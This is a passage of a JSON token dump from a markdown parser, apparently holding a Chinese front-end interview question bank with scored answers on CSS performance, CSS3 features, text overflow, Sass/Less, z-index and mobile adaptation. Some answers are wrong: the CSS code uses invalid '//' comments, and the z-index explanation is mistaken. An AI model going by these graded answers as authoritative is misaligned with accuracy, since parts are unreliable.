inside：标记在列表项内部\\n","text":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部","tokens":[{"type":"text","raw":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部","text":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部","escaped":false}]}]},{"type":"list_item","raw":"+ list-style-image\\n  list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","task":false,"loose":true,"text":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","tokens":[{"type":"text","raw":"list-style-image\\n\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","text":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","tokens":[{"type":"text","raw":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：","text":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：","escaped":false},{"type":"codespan","raw":"`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","text":"url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')"}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 16. CSS 性能优化\\n\\n","depth":2,"text":"16. CSS 性能优化","tokens":[{"type":"text","raw":"16. CSS 性能优化","text":"16. CSS 性能优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。\\n- **1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。\\n- **1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。\\n- **1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。\\n","task":false,"loose":false,"text":"**1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","tokens":[{"type":"text","raw":"**1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","text":"**1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","text":" 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。\\n","task":false,"loose":false,"text":"**1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","tokens":[{"type":"text","raw":"**1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","text":"**1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","text":" 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。\\n","task":false,"loose":false,"text":"**1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","tokens":[{"type":"text","raw":"**1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","text":"**1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","text":" 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","task":false,"loose":false,"text":"**1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","tokens":[{"type":"text","raw":"**1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","text":"**1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","text":" 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 17. CSS3中有哪些新特性\\n\\n","depth":2,"text":"17. CSS3中有哪些新特性","tokens":[{"type":"text","raw":"17. CSS3中有哪些新特性","text":"17. CSS3中有哪些新特性","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n\\n- 圆角 （border-radius:8px）\\n\\n- 多列布局 （multi-column layout）\\n\\n- 阴影和反射 （box-shadow 和 reflect）\\n\\n- 文字特效 （text-shadow）\\n\\n- 线性渐变 （gradient）\\n\\n- 旋转 （transform）\\n\\n- 媒体查询 （@media）\\n\\n- 2D、3D 转换和动画","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n\\n","task":false,"loose":true,"text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n","tokens":[{"type":"text","raw":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n","text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","tokens":[{"type":"text","raw":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","escaped":false}]}]},{"type":"list_item","raw":"- 圆角 （border-radius:8px）\\n\\n","task":false,"loose":true,"text":"圆角 （border-radius:8px）\\n","tokens":[{"type":"text","raw":"圆角 （border-radius:8px）\\n","text":"圆角 （border-radius:8px）","tokens":[{"type":"text","raw":"圆角 （border-radius:8px）","text":"圆角 （border-radius:8px）","escaped":false}]}]},{"type":"list_item","raw":"- 多列布局 （multi-column layout）\\n\\n","task":false,"loose":true,"text":"多列布局 （multi-column layout）\\n","tokens":[{"type":"text","raw":"多列布局 （multi-column layout）\\n","text":"多列布局 （multi-column layout）","tokens":[{"type":"text","raw":"多列布局 （multi-column layout）","text":"多列布局 （multi-column layout）","escaped":false}]}]},{"type":"list_item","raw":"- 阴影和反射 （box-shadow 和 reflect）\\n\\n","task":false,"loose":true,"text":"阴影和反射 （box-shadow 和 reflect）\\n","tokens":[{"type":"text","raw":"阴影和反射 （box-shadow 和 reflect）\\n","text":"阴影和反射 （box-shadow 和 reflect）","tokens":[{"type":"text","raw":"阴影和反射 （box-shadow 和 reflect）","text":"阴影和反射 （box-shadow 和 reflect）","escaped":false}]}]},{"type":"list_item","raw":"- 文字特效 （text-shadow）\\n\\n","task":false,"loose":true,"text":"文字特效 （text-shadow）\\n","tokens":[{"type":"text","raw":"文字特效 （text-shadow）\\n","text":"文字特效 （text-shadow）","tokens":[{"type":"text","raw":"文字特效 （text-shadow）","text":"文字特效 （text-shadow）","escaped":false}]}]},{"type":"list_item","raw":"- 线性渐变 （gradient）\\n\\n","task":false,"loose":true,"text":"线性渐变 （gradient）\\n","tokens":[{"type":"text","raw":"线性渐变 （gradient）\\n","text":"线性渐变 （gradient）","tokens":[{"type":"text","raw":"线性渐变 （gradient）","text":"线性渐变 （gradient）","escaped":false}]}]},{"type":"list_item","raw":"- 旋转 （transform）\\n\\n","task":false,"loose":true,"text":"旋转 （transform）\\n","tokens":[{"type":"text","raw":"旋转 （transform）\\n","text":"旋转 （transform）","tokens":[{"type":"text","raw":"旋转 （transform）","text":"旋转 （transform）","escaped":false}]}]},{"type":"list_item","raw":"- 媒体查询 （@media）\\n\\n","task":false,"loose":true,"text":"媒体查询 （@media）\\n","tokens":[{"type":"text","raw":"媒体查询 （@media）\\n","text":"媒体查询 （@media）","tokens":[{"type":"text","raw":"媒体查询 （@media）","text":"媒体查询 （@media）","escaped":false}]}]},{"type":"list_item","raw":"- 2D、3D 转换和动画","task":false,"loose":true,"text":"2D、3D 转换和动画","tokens":[{"type":"text","raw":"2D、3D 转换和动画","text":"2D、3D 转换和动画","tokens":[{"type":"text","raw":"2D、3D 转换和动画","text":"2D、3D 转换和动画","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 18. 单行、多行文本溢出隐藏\\n\\n","depth":2,"text":"18. 单行、多行文本溢出隐藏","tokens":[{"type":"text","raw":"18. 单行、多行文本溢出隐藏","text":"18. 单行、多行文本溢出隐藏","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 单行文本溢出","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 单行文本溢出","task":false,"loose":false,"text":"单行文本溢出","tokens":[{"type":"text","raw":"单行文本溢出","text":"单行文本溢出","tokens":[{"type":"text","raw":"单行文本溢出","text":"单行文本溢出","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\noverflow: hidden;            // 溢出隐藏\\ntext-overflow: ellipsis;      // 溢出用省略号显示\\nwhite-space: nowrap;         // 规定段落中的文本不进行换行\\n```","lang":"css","text":"overflow: hidden;            // 溢出隐藏\\ntext-overflow: ellipsis;      // 溢出用省略号显示\\nwhite-space: nowrap;         // 规定段落中的文本不进行换行"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 多行文本溢出","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 多行文本溢出","task":false,"loose":false,"text":"多行文本溢出","tokens":[{"type":"text","raw":"多行文本溢出","text":"多行文本溢出","tokens":[{"type":"text","raw":"多行文本溢出","text":"多行文本溢出","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\ndisplay: -webkit-box;         // 作为弹性伸缩盒子模型显示\\n-webkit-box-orient: vertical; // 设置伸缩盒子的子元素排列方式--从上到下垂直排列\\n-webkit-line-clamp: 3;        // 显示的行数\\noverflow: hidden;             // 溢出隐藏\\n```","lang":"css","text":"display: -webkit-box;         // 作为弹性伸缩盒子模型显示\\n-webkit-box-orient: vertical; // 设置伸缩盒子的子元素排列方式--从上到下垂直排列\\n-webkit-line-clamp: 3;        // 显示的行数\\noverflow: hidden;             // 溢出隐藏"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 19. Sass、Less 是什么？为什么要使用他们？\\n\\n","depth":2,"text":"19. Sass、Less 是什么？为什么要使用他们？","tokens":[{"type":"text","raw":"19. Sass、Less 是什么？为什么要使用他们？","text":"19. Sass、Less 是什么？为什么要使用他们？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n\\n- 为什么要使用它们？\\n\\n- 结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n\\n- 可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n\\n","task":false,"loose":true,"text":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n","tokens":[{"type":"text","raw":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。\\n","text":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。","tokens":[{"type":"text","raw":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。","text":"他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。","escaped":false}]}]},{"type":"list_item","raw":"- 为什么要使用它们？\\n\\n","task":false,"loose":true,"text":"为什么要使用它们？\\n","tokens":[{"type":"text","raw":"为什么要使用它们？\\n","text":"为什么要使用它们？","tokens":[{"type":"text","raw":"为什么要使用它们？","text":"为什么要使用它们？","escaped":false}]}]},{"type":"list_item","raw":"- 结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n\\n","task":false,"loose":true,"text":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n","tokens":[{"type":"text","raw":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。\\n","text":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。","tokens":[{"type":"text","raw":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。","text":"结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。","escaped":false}]}]},{"type":"list_item","raw":"- 可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","task":false,"loose":true,"text":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","tokens":[{"type":"text","raw":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","text":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","tokens":[{"type":"text","raw":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","text":"可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 20. z-index属性在什么情况下会失效?\\n\\n","depth":2,"text":"20. z-index属性在什么情况下会失效?","tokens":[{"type":"text","raw":"20. z-index属性在什么情况下会失效?","text":"20. z-index属性在什么情况下会失效?","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n\\n- 父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n\\n- 元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n\\n- 元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n\\n","task":false,"loose":true,"text":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n","tokens":[{"type":"text","raw":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。\\n","text":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。","tokens":[{"type":"text","raw":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。","text":"通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。","escaped":false}]}]},{"type":"list_item","raw":"- 父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n\\n","task":false,"loose":true,"text":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n","tokens":[{"type":"text","raw":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；\\n","text":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；","tokens":[{"type":"text","raw":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；","text":"父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；","escaped":false}]}]},{"type":"list_item","raw":"- 元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n\\n","task":false,"loose":true,"text":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n","tokens":[{"type":"text","raw":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；\\n","text":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；","tokens":[{"type":"text","raw":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；","text":"元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；","escaped":false}]}]},{"type":"list_item","raw":"- 元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","task":false,"loose":true,"text":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","tokens":[{"type":"text","raw":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","text":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","tokens":[{"type":"text","raw":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","text":"元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 21. 如何根据设计稿进行移动端适配？\\n\\n","depth":2,"text":"21. 如何根据设计稿进行移动端适配？","tokens":[{"type":"text","raw":"21. 如何根据设计稿进行移动端适配？","text":"21. 如何根据设计稿进行移动端适配？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 移动端适配主要有两个维度：\\n\\n- 适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n\\n- 适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。\\n\\n- 为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 移动端适配主要有两个维度：\\n\\n","task":false,"loose":true,"text":"移动端适配主要有两个维度：\\n","tokens":[{"type":"text","raw":"移动端适配主要有两个维度：\\n","text":"移动端适配主要有两个维度：","tokens":[{"type":"text","raw":"移动端适配主要有两个维度：","text":"移动端适配主要有两个维度：","escaped":false}]}]},{"type":"list_item","raw":"- 适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n\\n","task":false,"loose":true,"text":"适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；\\n","tokens":[{"type":"text","raw":"适配不同像素密度， 